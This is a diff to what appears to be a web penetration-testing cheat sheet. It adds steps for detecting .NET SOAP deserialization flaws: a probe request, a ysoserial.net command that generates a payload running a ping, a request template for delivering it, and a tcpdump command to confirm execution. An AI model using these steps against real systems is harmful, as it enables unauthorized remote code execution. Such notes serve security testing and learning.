@@ -330,10 +330,29 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 -> VIEWSTATE
     
 -> .NET remoting services
-  
-#### Tool
 
-https://github.com/pwntester/ysoserial.net
+#### Identify
+
+-> Detect via Response Simple in SOAP Message
+```
+POST /endpoint HTTP/1.1
+Host: ip:port
+
+<SOAP:Envelope>
+</SOAP:Envelope>
+```
+
+`ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -c "cmd /c ping ip" -o raw`  
+https://github.com/pwntester/ysoserial.net  
+```
+POST /endpoint HTTP/1.1
+Host: ip:port
+SOAPAction: something
+Contet-Type: text/xml
+
+<payload_ysoserial_here_without_<SOAP-ENV:Body>
+```
+`tcpdump -i tap0 icmp`
 
 ### Java Deserialization
 
